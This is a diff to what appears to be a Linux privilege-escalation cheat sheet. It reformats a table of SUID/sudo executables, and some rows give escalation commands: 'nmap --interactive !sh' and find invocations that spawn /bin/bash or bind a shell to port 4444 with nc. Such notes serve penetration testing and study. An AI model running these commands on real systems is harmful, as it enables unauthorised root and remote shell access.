@@ -32,17 +32,18 @@ What executables have SUID bit that can be executed as another user?
 
 If any of the following commands appear on the list of SUID or SUDO commands, they can be used for privledge escalation:
 
-| SUID / SUDO Executables            | Priv Esc Command                                                                    |
-|------------------------------------|-------------------------------------------------------------------------------------|
+| SUID / SUDO Executables               | Priv Esc Command                                                                    |
+|---------------------------------------|-------------------------------------------------------------------------------------|
 | nmap<br>(older versions 2.02 to 5.21) | nmap --interactive !sh                                                              |
-| awk                                |                                                                                     |
-| python                             |                                                                                     |
-| perl                               |                                                                                     |
-| find                               | find /home -exec nc -lvp 4444  -e /bin/bash \\;<br> find /home -exec /bin/bash \\;` |
-| xxd                                |                                                                                     |
-| vi                                 |                                                                                     |
-| bash                               |                                                                                     |
-| more                               |                                                                                     |
-| less                               |                                                                                     |
-| nano                               |                                                                                     |
-| cp                                 |                                                                                     |
+| awk                                   |                                                                                     |
+| python                                |                                                                                     |
+| perl                                  |                                                                                     |
+| find                                  | find /home -exec nc -lvp 4444  -e /bin/bash \\;<br> find /home -exec /bin/bash \\;  |
+| xxd                                   |                                                                                     |
+| vi                                    |                                                                                     |
+| bash                                  |                                                                                     |
+| more                                  |                                                                                     |
+| less                                  |                                                                                     |
+| nano                                  |                                                                                     |
+| cp                                    |                                                                                     |
+   
